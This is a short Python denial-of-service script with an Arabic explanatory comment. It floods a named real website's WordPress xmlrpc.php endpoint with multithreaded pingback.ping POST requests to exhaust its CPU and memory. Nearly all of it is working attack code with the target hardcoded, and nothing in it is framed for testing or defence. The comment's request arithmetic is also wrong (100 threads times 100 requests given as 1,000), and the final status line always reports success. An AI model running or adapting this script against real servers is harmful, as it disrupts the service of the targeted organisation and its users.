

#---------------------------------------
"""
الكود يقوم بإستنزاف XML-RPC

هو يرسل طلبات HTTP POST
متزامنة ، و يرسل عدة خيوط و لكل خيط يرسل عدة طلبات.

كل طلب يستهلك موارد الجهاذ ،
 حتي ولو تم رفض Pingback

-------

لنفترض اننا استخدما في al___threadse ( عدد الخيوط )
} 100 خيط {
و reques___thread (عدد الطلبات لكل خيط)
} 100 طلب لكل خيط {

إجمالي الطلبات = 1000

حجم كل طلب XML = ١.٥ كيلوبايت

إجمالي البيانات المرسلة ستكون 15MB

و تختلف علي عدد ثواني او دقائق الهجوم .


------

CPU: يستهلك بمعالة طلبات XML
RAM: يستهلك الذاكرة لكل طلب اثناء المعلجة
و غيرها.

"""
#---------------------------------------


import requests
import threading

u = "\033[1;34m"
tt = "\033[1;35m"
s = "\033[1;36m"
ss = "\033[3;36m"
q = "\033[1;31m"
z = "\033[1;33m"
o = "\033[1;32m"
oo = "\033[3;32m"

url = "https://fsc.org.sa/xmlrpc.php"
al___threadse = 6
reques___thread = 5

success = True
def send_requests():
    data = '''<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
   <methodName>pingback.ping</methodName>
   <params>
      <param><value><string>https://fsc.org.sa</string></value></param>
      <param><value><string>http://testphp.vulnweb.com</string></value></param>
   </params>
</methodCall>'''
    headers = {'Content-Type': 'text/xml'}

    for _ in range(reques___thread):
        try:
            response = requests.post(url, data=data, headers=headers)
            print(f"{u}Status{tt}:{s}~~》{o} {response.status_code}")
            if response.status_code != 200:
                success = False
        except Exception as e:
            print(f"{q}Error:{s} {e}")
            success = False

threads = []
for _ in range(al___threadse):
    t = threading.Thread(target=send_requests)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

status_msg = "success" if success else "failed"
print (f"{q}~~~~~~~~~~~~~~~~~~~~~~\n{q}[{u}condition{q}]{oo}success\n{q}[{u}info{q}]{tt}Number-of-threads:{z} {al___threadse}\n{q}[{u}info{q}]{tt}Number-of-requests-per-thread: {z}{reques___thread}")
